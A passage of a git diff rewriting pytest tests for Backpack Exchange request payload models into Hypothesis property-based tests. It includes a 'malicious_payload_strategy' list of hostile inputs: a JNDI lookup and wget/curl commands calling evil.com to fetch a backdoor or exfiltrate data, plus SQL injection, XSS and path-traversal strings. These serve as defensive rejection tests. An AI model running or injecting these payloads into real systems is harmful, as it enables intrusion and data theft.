@@ -1,795 +1,1099 @@
-"""Unit tests for Backpack Raw API Request Payload Models.
+"""Property-based tests for Backpack raw API request payload models.
 
-Tests the Pydantic models defined in cyberdelta.apis.backpack.models.bp_raw_api_request_payloads.py.
-These models represent request payloads sent to Backpack Exchange API endpoints.
+These tests validate critical security boundary models that process external request payload data.
+The models tested here are essential for trading order placement, account management, and transfer operations.
 
-Tests focus on:
-1. Valid instantiation with required and optional fields
-2. Field-level validation (type, format, Literal constraints)
-3. Alias functionality (Field(alias=...))
-4. Model configuration (extra="forbid", frozen=True)
+SECURITY CRITICAL: These raw models protect against:
+- Malicious request payload data that could manipulate trading operations
+- Financial precision errors in order prices and quantities
+- Buffer overflow attacks through oversized payload values
+- Injection attacks through malformed request structures
+- Parameter manipulation that could affect order execution
+- Authentication manipulation that could affect authorization
+
+Property testing ensures comprehensive coverage of request payload edge cases and adversarial inputs.
 """
 
+from decimal import Decimal
 from typing import Any, Literal
 
 import pytest
+from hypothesis import given, strategies as st, assume
+from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
 from cyberdelta.apis.backpack.models.bp_raw_api_request_payloads import (
-    BackpackRawAccountConvertDustRequest,
-    BackpackRawAccountWithdrawalRequest,
-    BackpackRawBorrowLendExecuteRequest,
-    BackpackRawInternalTransferRequest,
-    BackpackRawOrderCancelAllRequest,
-    BackpackRawOrderCancelRequest,
     BackpackRawOrderExecuteRequest,
-    BackpackRawQuoteAcceptRequest,
+    BackpackRawOrderCancelRequest,
+    BackpackRawOrderCancelAllRequest,
+    BackpackRawAccountWithdrawalRequest,
+    BackpackRawUpdateAccountSettingsRequest,
+    BackpackRawAccountConvertDustRequest,
+    BackpackRawBorrowLendExecuteRequest,
+    BackpackRawRequestForQuoteRequest,
     BackpackRawQuoteSubmitRequest,
+    BackpackRawQuoteAcceptRequest,
     BackpackRawRequestForQuoteCancelRequest,
     BackpackRawRequestForQuoteRefreshRequest,
-    BackpackRawRequestForQuoteRequest,
-    BackpackRawUpdateAccountSettingsRequest,
+    BackpackRawInternalTransferRequest,
 )
+from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
-from tests.common_symbols import BTC_USDC_BP, ETH_USDC_BP, SOL_USDC_BP
 
 
-class TestBackpackRawOrderExecuteRequest:
-    """Tests for BackpackRawOrderExecuteRequest model."""
+# =============================================================================
+# HYPOTHESIS STRATEGIES FOR REQUEST PAYLOAD MODEL TESTING
+# =============================================================================
 
-    def test_valid_minimal_limit_order(self) -> None:
-        """Test valid instantiation with minimal required fields for LIMIT order."""
-        request = BackpackRawOrderExecuteRequest(
-            orderType="Limit",
-            side="Bid",
-            symbol=SOL_USDC_BP.value,
-            price="100.50",
-            quantity="10.0",
-        )
-        assert request.orderType == "Limit"
-        assert request.side == "Bid"
-        assert request.symbol == SOL_USDC_BP.value
-        assert request.price == "100.50"
-        assert request.quantity == "10.0"
-        # All optional fields should be None by default
-        assert request.clientId is None
-        assert request.postOnly is None
-        assert request.reduceOnly is None
 
-    def test_valid_minimal_market_order(self) -> None:
-        """Test valid instantiation with minimal required fields for MARKET order."""
-        request = BackpackRawOrderExecuteRequest(
-            orderType="Market",
-            side="Ask",
-            symbol=BTC_USDC_BP.value,
-            quantity="0.5",
-        )
-        assert request.orderType == "Market"
-        assert request.side == "Ask"
-        assert request.symbol == BTC_USDC_BP.value
-        assert request.quantity == "0.5"
-        assert request.price is None  # Not required for market orders
+def financial_decimal_strategy() -> SearchStrategy[str]:
+    """Generate decimal strings for financial amounts (prices, quantities)."""
+    return st.one_of([
+        # Trading amounts and prices
+        st.decimals(min_value=Decimal("0"), max_value=Decimal("1000000"), places=8).map(str),
+        st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal("100000"), places=6).map(
+            str
+        ),
+        # Common trading values
+        st.just("0"),  # Zero amount
+        st.just("0.0"),  # Zero with decimal
+        st.just("100.0"),  # Standard price
+        st.just("0.5"),  # Fractional BTC
+        st.just("1000.123456"),  # USDC with precision
+        st.just("0.00000001"),  # Minimum precision
+        st.just("50000.99"),  # BTC price
+        st.just("1800.50"),  # ETH price
+        st.just("150.25"),  # SOL price
+        # Scientific notation (valid for decimal parsing)
+        st.just("1e6"),
+        st.just("1.5e3"),
+        st.just("2.5e-4"),
+    ])
 
-    def test_valid_full_order_with_all_fields(self) -> None:
-        """Test valid instantiation with all fields populated."""
-        request = BackpackRawOrderExecuteRequest(
-            orderType="Limit",
-            side="Bid",
-            symbol=ETH_USDC_BP.value,
-            clientId=12345,
-            postOnly=True,
-            price="1800.00",
-            quantity="1.0",
-            quoteQuantity="1800.00",
-            reduceOnly=False,
-            selfTradePrevention="RejectTaker",
-            timeInForce="GTC",
-            autoLend=True,
-            autoLendRedeem=False,
-            autoBorrow=True,
-            autoBorrowRepay=False,
-            stopLossTriggerPrice="1700.00",
-            stopLossTriggerBy="LastPrice",
-            stopLossLimitPrice="1650.00",
-            takeProfitTriggerPrice="2000.00",
-            takeProfitTriggerBy="MarkPrice",
-            takeProfitLimitPrice="2050.00",
-        )
-        assert request.orderType == "Limit"
-        assert request.clientId == 12345
-        assert request.postOnly is True
-        assert request.selfTradePrevention == "RejectTaker"
-        assert request.timeInForce == "GTC"
-        assert request.stopLossTriggerBy == "LastPrice"
-        assert request.takeProfitTriggerBy == "MarkPrice"
 
-    def test_aliases_work_correctly(self) -> None:
-        """Test that Field aliases work correctly."""
-        # Create using valid typed data
-        request = BackpackRawOrderExecuteRequest(
-            orderType="Limit",
-            side="Bid",
-            symbol=SOL_USDC_BP.value,
-            clientId=123,
-            price="100.00",
-            quantity="10.0",
-        )
+def order_type_strategy() -> SearchStrategy[str]:
+    """Generate valid order type literal values."""
+    return st.sampled_from(["Market", "Limit"])
 
-        # Access using Python attribute names
-        assert request.orderType == "Limit"
-        assert request.side == "Bid"
-        assert request.symbol == SOL_USDC_BP.value
-        assert request.clientId == 123
 
-    def test_invalid_order_type_literal(self) -> None:
-        """Test validation error for invalid orderType."""
-        invalid_data: dict[str, Any] = {
-            "orderType": "Invalid",  # Not in Literal["Market", "Limit"]
-            "side": "Bid",
-            "symbol": SOL_USDC_BP.value,
-        }
-        with pytest.raises(ValidationError):
-            BackpackRawOrderExecuteRequest(**invalid_data)
+def order_side_strategy() -> SearchStrategy[str]:
+    """Generate valid order side literal values."""
+    return st.sampled_from(["Bid", "Ask"])
 
-    def test_invalid_side_literal(self) -> None:
-        """Test validation error for invalid side."""
-        invalid_data: dict[str, Any] = {
+
+def symbol_strategy() -> SearchStrategy[str]:
+    """Generate valid trading symbols."""
+    return st.one_of([
+        # Common symbols
+        st.just("BTC_USDC"),
+        st.just("ETH_USDC"),
+        st.just("SOL_USDC"),
+        st.just("BTC_USDT"),
+        st.just("ETH_USDT"),
+        # Generated symbols
+        st.text(
+            min_size=3,
+            max_size=20,
+            alphabet=st.characters(
+                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
+            ),
+        ).filter(lambda x: x and len(x.encode("utf-8")) <= 64),
+        # Edge cases
+        st.just("A_B"),  # Minimum length
+        st.just("VERYLONGSYMBOL_USDC"),  # Longer symbol
+    ])
+
+
+def client_id_strategy() -> SearchStrategy[int]:
+    """Generate valid client ID values."""
+    return st.integers(min_value=1, max_value=4294967295)  # uint32 range
+
+
+def blockchain_strategy() -> SearchStrategy[str]:
+    """Generate valid blockchain literal values."""
+    return st.sampled_from([
+        "Arbitrum",
+        "Base",
+        "Bitcoin",
+        "BitcoinCash",
+        "BNBSmartChain",
+        "Cardano",
+        "Dogecoin",
+        "Ethereum",
+        "Litecoin",
+        "Polygon",
+        "Solana",
+        "Story",
+        "Sui",
+        "XRP",
+    ])
+
+
+def asset_symbol_strategy() -> SearchStrategy[str]:
+    """Generate valid asset symbol literal values."""
+    return st.sampled_from([
+        "BTC",
+        "ETH",
+        "SOL",
+        "USDC",
+        "USDT",
+        "PYTH",
+        "JTO",
+        "JUP",
+        "RNDR",
+        "TNSR",
+        "W",
+        "INF",
+        "MOBILE",
+        "KMNO",
+        "MEW",
+        "DRIFT",
+        "WIF",
+        "CLOUD",
+        "MICHI",
+        "TRUMP",
+        "TOLY",
+        "BONK",
+        "RAY",
+        "WEN",
+        "BODEN",
+        "SAMO",
+        "BOME",
+        "HNT",
+        "IO",
+        "DJT",
+        "MATIC",
+        "BNB",
+        "HYPE",
+        "VIRTUAL",
+        "AI16Z",
+        "PENGU",
+        "ME",
+        "GRASS",
+        "MOVE",
+        "DOGE",
+        "SUI",
+        "BNSOL",
+        "JITOSOL",
+        "MOODENG",
+        "LESTER",
+    ])
+
+
+def time_in_force_strategy() -> SearchStrategy[str]:
+    """Generate valid time in force literal values."""
+    return st.sampled_from(["GTC", "IOC", "FOK"])
+
+
+def self_trade_prevention_strategy() -> SearchStrategy[str]:
+    """Generate valid self trade prevention literal values."""
+    return st.sampled_from(["RejectTaker", "RejectMaker", "RejectBoth"])
+
+
+def trigger_by_strategy() -> SearchStrategy[str]:
+    """Generate valid trigger by literal values."""
+    return st.sampled_from(["LastPrice", "MarkPrice", "IndexPrice"])
+
+
+def borrow_lend_side_strategy() -> SearchStrategy[str]:
+    """Generate valid borrow/lend side literal values."""
+    return st.sampled_from(["Borrow", "Lend", "Repay", "Redeem"])
+
+
+def account_type_strategy() -> SearchStrategy[str]:
+    """Generate valid account type literal values."""
+    return st.sampled_from(["SPOT", "MARGIN", "FUTURES"])
+
+
+def address_strategy() -> SearchStrategy[str]:
+    """Generate valid address strings."""
+    return st.one_of([
+        # Common address patterns
+        st.just("0x1234567890abcdef"),
+        st.just("bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4"),
+        st.just("1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"),
+        # Generated addresses
+        st.text(
+            min_size=10,
+            max_size=64,
+            alphabet=st.characters(
+                whitelist_categories=["Nd"], whitelist_characters="abcdefABCDEF"
+            ),
+        ).filter(lambda x: x and len(x.encode("utf-8")) <= 128),
+    ])
+
+
+def rfq_id_strategy() -> SearchStrategy[str]:
+    """Generate valid RFQ ID strings."""
+    return st.one_of([
+        # Common patterns
+        st.just("rfq_123"),
+        st.just("quote_456"),
+        st.text(
+            min_size=3,
+            max_size=20,
+            alphabet=st.characters(
+                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
+            ),
+        ).filter(lambda x: x and len(x.encode("utf-8")) <= 64),
+    ])
+
+
+def timestamp_strategy() -> SearchStrategy[int]:
+    """Generate valid timestamp values."""
+    return st.integers(min_value=1640995200000, max_value=2147483647000)  # Valid timestamp range
+
+
+@st.composite
+def valid_order_execute_data(draw) -> dict[str, Any]:
+    """Generate valid order execute request data."""
+    order_type = draw(order_type_strategy())
+    base_data = {
+        "orderType": order_type,
+        "side": draw(order_side_strategy()),
+        "symbol": draw(symbol_strategy()),
+    }
+
+    # Add required fields for limit orders
+    if order_type == "Limit":
+        base_data["price"] = draw(financial_decimal_strategy())
+        base_data["quantity"] = draw(financial_decimal_strategy())
+    else:  # Market order
+        base_data["quantity"] = draw(financial_decimal_strategy())
+
+    # Randomly add optional fields
+    if draw(st.booleans()):
+        base_data["clientId"] = draw(client_id_strategy())
+    if draw(st.booleans()):
+        base_data["postOnly"] = draw(st.booleans())
+    if draw(st.booleans()):
+        base_data["timeInForce"] = draw(time_in_force_strategy())
+
+    return base_data
+
+
+@st.composite
+def valid_order_cancel_data(draw) -> dict[str, Any]:
+    """Generate valid order cancel request data."""
+    base_data = {
+        "symbol": draw(symbol_strategy()),
+    }
+
+    # Add either orderId or clientId (or both)
+    if draw(st.booleans()):
+        base_data["orderId"] = draw(rfq_id_strategy())
+    if draw(st.booleans()):
+        base_data["clientId"] = draw(client_id_strategy())
+
+    return base_data
+
+
+@st.composite
+def valid_withdrawal_request_data(draw) -> dict[str, Any]:
+    """Generate valid withdrawal request data."""
+    return {
+        "address": draw(address_strategy()),
+        "blockchain": draw(blockchain_strategy()),
+        "quantity": draw(financial_decimal_strategy()),
+        "symbol": draw(asset_symbol_strategy()),
+    }
+
+
+@st.composite
+def valid_borrow_lend_data(draw) -> dict[str, Any]:
+    """Generate valid borrow/lend request data."""
+    return {
+        "quantity": draw(financial_decimal_strategy()),
+        "side": draw(borrow_lend_side_strategy()),
+        "symbol": draw(asset_symbol_strategy()),
+    }
+
+
+@st.composite
+def valid_rfq_request_data(draw) -> dict[str, Any]:
+    """Generate valid RFQ request data."""
+    base_data = {
+        "symbol": draw(symbol_strategy()),
+    }
+
+    # Add either quantity or quoteQuantity (or both)
+    if draw(st.booleans()):
+        base_data["quantity"] = draw(financial_decimal_strategy())
+    if draw(st.booleans()):
+        base_data["quoteQuantity"] = draw(financial_decimal_strategy())
+
+    return base_data
+
+
+@st.composite
+def valid_internal_transfer_data(draw) -> dict[str, Any]:
+    """Generate valid internal transfer data."""
+    from_account = draw(account_type_strategy())
+    to_account = draw(account_type_strategy())
+
+    return {
+        "symbol": draw(symbol_strategy()),
+        "quantity": draw(financial_decimal_strategy()),
+        "fromAccount": from_account,
+        "toAccount": to_account,
+    }
+
+
+def malicious_payload_strategy() -> SearchStrategy[Any]:
+    """Generate malicious values for request payload security testing."""
+    return st.one_of([
+        # Financial manipulation attempts
+        st.just("${jndi:ldap://evil.com/steal-orders}"),
+        st.just("999999999999999999999999999999.99"),  # Overflow attempt
+        st.just("../../etc/passwd"),  # Path traversal
+        # XSS attempts
+        st.just("<script>alert('order-xss')</script>"),
+        st.just("<img src=x onerror=alert(document.cookie)>"),
+        # SQL injection attempts
+        st.just("'; DROP TABLE orders;--"),
+        st.just("1' UNION SELECT * FROM accounts--"),
+        # Buffer overflow attempts
+        st.text(min_size=10000, max_size=50000),
+        st.just("P" * 10000),
+        # Unicode attacks
+        st.just("\udce2\udc28\udc00"),  # Lone surrogates
+        st.just("\x00\x01\x02"),  # Control characters
+        # Format string attacks
+        st.just("%s%s%s%s%n"),
+        st.just("%x%x%x%x"),
+        # Command injection
+        st.just("; wget evil.com/backdoor"),
+        st.just("`curl evil.com/exfiltrate`"),
+        # NoSQL injection
+        st.just("'; return db.orders.find(); //"),
+        # JSON injection
+        st.just('{"$where": "this.price > 100000"}'),
+        # Order manipulation
+        st.just("100.0'; UPDATE orders SET price=0;--"),
+        # Type confusion
+        st.none(),
+        st.integers(),
+        st.floats(),
+        st.booleans(),
+        st.lists(st.text()),
+        st.dictionaries(st.text(), st.text()),
+        st.binary(),
+    ])
+
+
+# =============================================================================
+# PROPERTY TESTS FOR BACKPACK RAW ORDER EXECUTE REQUEST MODEL
+# =============================================================================
+
+
+class TestBackpackRawOrderExecuteRequestProperties:
+    """Property-based tests for BackpackRawOrderExecuteRequest validation and security."""
+
+    @given(order_data=valid_order_execute_data())
+    def test_order_execute_validation_success_properties(self, order_data: dict[str, Any]) -> None:
+        """Property: Valid order execute data should always create valid BackpackRawOrderExecuteRequest objects."""
+        # Skip invalid decimal values
+        try:
+            for field in ["price", "quantity"]:
+                if field in order_data:
+                    decimal_val = Decimal(order_data[field])
+                    assume(decimal_val.is_finite() and decimal_val >= 0)
+        except (ValueError, TypeError):
+            assume(False)
+
+        # Skip empty or invalid strings
+        for field in ["orderType", "side", "symbol"]:
+            value = order_data[field]
+            assume(isinstance(value, str) and value.strip())
+            assume(len(value.encode("utf-8")) <= 64)
+
+        obj = BackpackRawOrderExecuteRequest.model_validate(order_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, BackpackRawOrderExecuteRequest)
+
+        # Property: All fields should be preserved with correct types
+        assert obj.orderType == order_data["orderType"]
+        assert obj.side == order_data["side"]
+        assert obj.symbol == order_data["symbol"]
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+        assert obj.model_config.get("populate_by_name") is True
+
+    @given(
+        field_name=st.sampled_from([
+            "orderType",
+            "side",
+            "symbol",
+            "price",
+            "quantity",
+            "clientId",
+        ]),
+        malicious_value=malicious_payload_strategy(),
+    )
+    def test_order_execute_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Order execute request model should reject malicious inputs safely."""
+        base_data = {
             "orderType": "Limit",
-            "side": "Invalid",  # Not in Literal["Bid", "Ask"]
-            "symbol": SOL_USDC_BP.value,
-        }
-        with pytest.raises(ValidationError):
-            BackpackRawOrderExecuteRequest(**invalid_data)
-
-    def test_invalid_time_in_force_literal(self) -> None:
-        """Test validation error for invalid timeInForce."""
-        invalid_data: dict[str, Any] = {
-            "orderType": "Limit",
             "side": "Bid",
-            "symbol": SOL_USDC_BP.value,
-            "timeInForce": "Invalid",  # Not in Literal["GTC", "IOC", "FOK"]
-        }
-        with pytest.raises(ValidationError):
-            BackpackRawOrderExecuteRequest(**invalid_data)
-
-    def test_invalid_self_trade_prevention_literal(self) -> None:
-        """Test validation error for invalid selfTradePrevention."""
-        invalid_data: dict[str, Any] = {
-            "orderType": "Limit",
-            "side": "Bid",
-            "symbol": SOL_USDC_BP.value,
-            "selfTradePrevention": "Invalid",  # Not in allowed literals
-        }
-        with pytest.raises(ValidationError):
-            BackpackRawOrderExecuteRequest(**invalid_data)
-
-    def test_invalid_trigger_by_literal(self) -> None:
-        """Test validation error for invalid trigger by fields."""
-        invalid_data: dict[str, Any] = {
-            "orderType": "Limit",
-            "side": "Bid",
-            "symbol": SOL_USDC_BP.value,
-            "stopLossTriggerBy": "Invalid",  # Not in allowed literals
-        }
-        with pytest.raises(ValidationError):
-            BackpackRawOrderExecuteRequest(**invalid_data)
-
-    def test_invalid_client_id_type(self) -> None:
-        """Test validation error for invalid clientId type."""
-        invalid_data: dict[str, Any] = {
-            "orderType": "Limit",
-            "symbol": BTC_USDC_BP.value,
-            "side": "Bid",
-            "quantity": "1.0",
+            "symbol": "BTC_USDC",
             "price": "50000.0",
-            "clientId": "invalid_string_id",  # Should be integer
-        }
-        with pytest.raises(ValidationError):
-            BackpackRawOrderExecuteRequest(**invalid_data)
-
-    def test_invalid_price_format(self) -> None:
-        """Test validation error for invalid price format."""
-        invalid_data: dict[str, Any] = {
-            "orderType": "Limit",
-            "symbol": BTC_USDC_BP.value,
-            "side": "Bid",
             "quantity": "1.0",
-            "price": 50000,  # Should be string
-            "clientId": 12345,
         }
-        with pytest.raises(TypeError):
-            BackpackRawOrderExecuteRequest(**invalid_data)
+        base_data[field_name] = malicious_value
 
-    def test_invalid_boolean_type(self) -> None:
-        """Test validation error for invalid boolean fields."""
-        invalid_data: dict[str, Any] = {
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            BackpackRawOrderExecuteRequest.model_validate(base_data)
+
+    @given(
+        decimal_field=st.sampled_from(["price", "quantity"]),
+        decimal_value=st.one_of([
+            # Valid decimals
+            st.just("0"),
+            st.just("100.50"),
+            st.just("1e6"),
+            st.just("2.5e-4"),
+            # Invalid decimals
+            st.just("-100.0"),  # Negative
+            st.just("NaN"),
+            st.just("inf"),
+            st.just("-inf"),
+            st.just("Infinity"),
+            st.just("-Infinity"),
+            st.just("1..0"),
+            st.just("not_a_number"),
+            st.just(""),
+            st.just("   "),
+        ]),
+    )
+    def test_order_execute_decimal_validation_properties(
+        self, decimal_field: str, decimal_value: str
+    ) -> None:
+        """Property: Order execute decimal fields should validate properly."""
+        order_data = {
             "orderType": "Limit",
-            "symbol": BTC_USDC_BP.value,
             "side": "Bid",
-            "quantity": "1.0",
+            "symbol": "BTC_USDC",
             "price": "50000.0",
-            "clientId": 12345,
-            "reduceOnly": "true",  # Should be boolean
+            "quantity": "1.0",
         }
-        with pytest.raises(TypeError):
-            BackpackRawOrderExecuteRequest(**invalid_data)
+        order_data[decimal_field] = decimal_value
 
-    def test_extra_fields_forbidden(self) -> None:
-        """Test that extra fields are forbidden."""
-        invalid_data: dict[str, Any] = {
-            "orderType": "Limit",
+        try:
+            # Check if the value can be parsed as a finite decimal
+            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
+            is_finite = decimal_val.is_finite()
+            is_empty = not decimal_value.strip()
+
+            if is_finite and not is_empty:
+                # Property: Valid finite decimals should be accepted
+                obj = BackpackRawOrderExecuteRequest.model_validate(order_data)
+                field_value = getattr(obj, decimal_field)
+                assert field_value == decimal_value
+            else:
+                # Property: Non-finite or empty values should be rejected
+                with pytest.raises((ValidationError, EmptyStringError)):
+                    BackpackRawOrderExecuteRequest.model_validate(order_data)
+
+        except (ValueError, TypeError):
+            # Property: Unparseable decimal strings should be rejected
+            with pytest.raises(ValidationError):
+                BackpackRawOrderExecuteRequest.model_validate(order_data)
+
+    @given(order_data=valid_order_execute_data())
+    def test_order_execute_immutability_properties(self, order_data: dict[str, Any]) -> None:
+        """Property: Order execute objects should be immutable after creation."""
+        # Skip invalid data
+        try:
+            for field in ["price", "quantity"]:
+                if field in order_data:
+                    decimal_val = Decimal(order_data[field])
+                    assume(decimal_val.is_finite() and decimal_val >= 0)
+            for field in ["orderType", "side", "symbol"]:
+                assume(isinstance(order_data[field], str) and order_data[field].strip())
+        except (ValueError, TypeError):
+            assume(False)
+
+        obj = BackpackRawOrderExecuteRequest.model_validate(order_data)
+
+        # Property: Fields should not be modifiable
+        with pytest.raises(ValidationError, match="Instance is frozen"):
+            obj.orderType = "Market"
+
+        with pytest.raises(ValidationError, match="Instance is frozen"):
+            obj.price = "60000.0"
+
+    @given(
+        order_type=order_type_strategy(),
+        invalid_literal=st.text().filter(lambda x: x not in ["Market", "Limit"]),
+    )
+    def test_order_execute_literal_validation_properties(
+        self, order_type: str, invalid_literal: str
+    ) -> None:
+        """Property: Order execute literal fields should validate strictly."""
+        valid_data = {
+            "orderType": order_type,
             "side": "Bid",
-            "symbol": SOL_USDC_BP.value,
-            "extraField": "not_allowed",  # Should be forbidden
+            "symbol": "BTC_USDC",
+            "quantity": "1.0",
         }
+
+        # Property: Valid literals should be accepted
+        if order_type == "Limit":
+            valid_data["price"] = "50000.0"
+
+        obj = BackpackRawOrderExecuteRequest.model_validate(valid_data)
+        assert obj.orderType == order_type
+
+        # Property: Invalid literals should be rejected
+        invalid_data = valid_data.copy()
+        invalid_data["orderType"] = invalid_literal
+
         with pytest.raises(ValidationError):
-            BackpackRawOrderExecuteRequest(**invalid_data)
-
-    def test_model_is_frozen(self) -> None:
-        """Test that model instances are immutable (frozen=True)."""
-        request = BackpackRawOrderExecuteRequest(
-            orderType="Limit",
-            side="Bid",
-            symbol=SOL_USDC_BP.value,
-        )
-        with pytest.raises(ValidationError):
-            request.orderType = "Market"  # Should fail due to frozen=True
+            BackpackRawOrderExecuteRequest.model_validate(invalid_data)
 
 
-class TestBackpackRawOrderCancelRequest:
-    """Tests for BackpackRawOrderCancelRequest model."""
+# =============================================================================
+# PROPERTY TESTS FOR BACKPACK RAW ORDER CANCEL REQUEST MODEL
+# =============================================================================
 
-    def test_valid_with_order_id(self) -> None:
-        """Test valid instantiation with orderId."""
-        request = BackpackRawOrderCancelRequest(
-            symbol=SOL_USDC_BP.value,
-            orderId="order_123",
-        )
-        assert request.symbol == SOL_USDC_BP.value
-        assert request.orderId == "order_123"
-        assert request.clientId is None
 
-    def test_valid_with_client_id(self) -> None:
-        """Test valid instantiation with clientId."""
-        request = BackpackRawOrderCancelRequest(
-            symbol=SOL_USDC_BP.value,
-            clientId=123,
-        )
-        assert request.symbol == SOL_USDC_BP.value
-        assert request.clientId == 123
-        assert request.orderId is None
+class TestBackpackRawOrderCancelRequestProperties:
+    """Property-based tests for BackpackRawOrderCancelRequest validation and security."""
 
-    def test_valid_with_neither_id(self) -> None:
-        """Test valid instantiation with neither ID (model allows this)."""
-        request = BackpackRawOrderCancelRequest(
-            symbol=SOL_USDC_BP.value,
-        )
-        assert request.symbol == SOL_USDC_BP.value
-        assert request.orderId is None
-        assert request.clientId is None
+    @given(cancel_data=valid_order_cancel_data())
+    def test_order_cancel_validation_success_properties(self, cancel_data: dict[str, Any]) -> None:
+        """Property: Valid order cancel data should always create valid BackpackRawOrderCancelRequest objects."""
+        # Skip empty or invalid strings
+        assume(isinstance(cancel_data["symbol"], str) and cancel_data["symbol"].strip())
+        assume(len(cancel_data["symbol"].encode("utf-8")) <= 64)
 
-    def test_invalid_client_id_type(self) -> None:
-        """Test validation error for invalid clientId type."""
-        invalid_data: dict[str, Any] = {
-            "symbol": SOL_USDC_BP.value,
-            "clientId": "not_an_int",
+        obj = BackpackRawOrderCancelRequest.model_validate(cancel_data)
+
+        # Property: Object should be created successfully
+        assert isinstance(obj, BackpackRawOrderCancelRequest)
+
+        # Property: Symbol should be preserved
+        assert obj.symbol == cancel_data["symbol"]
+
+        # Property: Model should be configured correctly
+        assert obj.model_config.get("extra") == "forbid"
+        assert obj.model_config.get("frozen") is True
+        assert obj.model_config.get("populate_by_name") is True
+
+    @given(
+        field_name=st.sampled_from(["symbol", "orderId", "clientId"]),
+        malicious_value=malicious_payload_strategy(),
+    )
+    def test_order_cancel_security_boundary_properties(
+        self, field_name: str, malicious_value: Any
+    ) -> None:
+        """Property: Order cancel request model should reject malicious inputs safely."""
+        base_data = {
+            "symbol": "BTC_USDC",
+            "orderId": "order_123",
         }
-        with pytest.raises(ValidationError):
-            BackpackRawOrderCancelRequest(**invalid_data)
+        base_data[field_name] = malicious_value
 
-    def test_empty_symbol_validation(self) -> None:
-        """Test validation error for empty symbol."""
-        with pytest.raises(EmptyStringError):
-            BackpackRawOrderCancelRequest(
-                symbol="",  # Empty string should fail
-            )
-
-    def test_model_is_frozen(self) -> None:
-        """Test that model instances are immutable."""
-        request = BackpackRawOrderCancelRequest(symbol=SOL_USDC_BP.value)
-        with pytest.raises(ValidationError):
-            request.symbol = BTC_USDC_BP.value
+        # Property: Malicious input should be rejected
+        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
+            BackpackRawOrderCancelRequest.model_validate(base_data)
 
 
-class TestBackpackRawOrderCancelAllRequest:
-    """Tests for BackpackRawOrderCancelAllRequest model."""
-
-    def test_valid_minimal(self) -> None:
-        """Test valid instantiation with only required fields."""
-        request = BackpackRawOrderCancelAllRequest(symbol=SOL_USDC_BP.value)
-        assert request.symbol == SOL_USDC_BP.value
-        assert request.orderType is None
-
-    def test_valid_with_order_type_filter(self) -> None:
-        """Test valid instantiation with orderType filter."""
-        request = BackpackRawOrderCancelAllRequest(
-            symbol=SOL_USDC_BP.value,
-            orderType="RestingLimitOrder",
-        )
-        assert request.symbol == SOL_USDC_BP.value
-        assert request.orderType == "RestingLimitOrder"
-
-    def test_invalid_order_type_literal(self) -> None:
-        """Test validation error for invalid orderType."""
-        invalid_data: dict[str, Any] = {
-            "symbol": SOL_USDC_BP.value,
-            "orderType": "Invalid",  # Not in allowed literals
-        }
-        with pytest.raises(ValidationError):
-            BackpackRawOrderCancelAllRequest(**invalid_data)
-
-    def test_conditional_order_type_valid(self) -> None:
-        """Test valid ConditionalOrder orderType."""
-        request = BackpackRawOrderCancelAllRequest(
-            symbol=SOL_USDC_BP.value,
-            orderType="ConditionalOrder",
-        )
-        assert request.orderType == "ConditionalOrder"
+# =============================================================================
+# PROPERTY TESTS FOR BACKPACK RAW WITHDRAWAL REQUEST MODEL
+# =============================================================================
 
 
-class TestBackpackRawAccountWithdrawalRequest:
-    """Tests for BackpackRawAccountWithdrawalRequest model."""
+class TestBackpackRawAccountWithdrawalRequestProperties:
+    """Property-based tests for BackpackRawAccountWithdrawalRequest validation and security."""
 
-    def test_valid_minimal_withdrawal(self) -> None:
-        """Test valid instantiation with minimal required fields."""
-        request = BackpackRawAccountWithdrawalRequest(
-            address="0x1234567890abcdef",
-            blockchain="Ethereum",
-            quantity="100.50",
-            symbol="USDC",
-        )
-        assert request.address == "0x1234567890abcdef"
-        assert request.blockchain == "Ethereum"
-        assert request.quantity == "100.50"
-        assert request.symbol == "USDC"
-        assert request.clientId is None
-        assert request.twoFactorToken is None
+    @given(withdrawal_data=valid_withdrawal_request_data())
+    def test_withdrawal_request_validation_success_properties(
+        self, withdrawal_data: dict[str, Any]
+    ) -> None:
+        """Property: Valid withdrawal request data should always create valid BackpackRawAccountWithdrawalRequest objects."""
+        # Skip invalid decimal values
+        try:
+            decimal_val = Decimal(withdrawal_data["quantity"])
+            assume(decimal_val.is_finite() and decimal_val >= 0)
+        except (ValueError, TypeError):
+            assume(False)
 
-    def test_valid_with_optional_fields(self) -> None:
-        """Test valid instantiation with optional fields."""
-        request = BackpackRawAccountWithdrawalRequest(
-            address="0x1234567890abcdef",
-            blockchain="Polygon",
-            quantity="50.0",
-            symbol="BTC",
-            clientId="withdrawal_123",
-            twoFactorToken="2fa_token",
-            addressTag="memo_tag",
-            autoBorrow=True,
-            autoLendRedeem=False,
-        )
-        assert request.clientId == "withdrawal_123"
-        assert request.twoFactorToken == "2fa_token"
-        assert request.addressTag == "memo_tag"
-        assert request.autoBorrow is True
-        assert request.autoLendRedeem is False
+        # Skip empty or invalid strings
+        for field in ["address", "blockchain", "symbol"]:
+            value = withdrawal_data[field]
+            assume(isinstance(value, str) and value.strip())
+            assume(len(value.encode("utf-8")) <= 128)  # Address can be longer
 
-    def test_invalid_blockchain_literal(self) -> None:
-        """Test validation error for invalid blockchain."""
-        invalid_data: dict[str, Any] = {
-            "address": "0x1234567890abcdef",
-            "blockchain": "InvalidChain",  # Not in allowed literals
-            "quantity": "100.0",
-            "symbol": "USDC",
-        }
-        with pytest.raises(ValidationError):
-            BackpackRawAccountWithdrawalRequest(**invalid_data)
+        obj = BackpackRawAccountWithdrawalRequest.model_validate(withdrawal_data)
 
-    def test_invalid_symbol_literal(self) -> None:
-        """Test validation error for invalid symbol."""
-        invalid_data: dict[str, Any] = {
+        # Property: Object should be created successfully
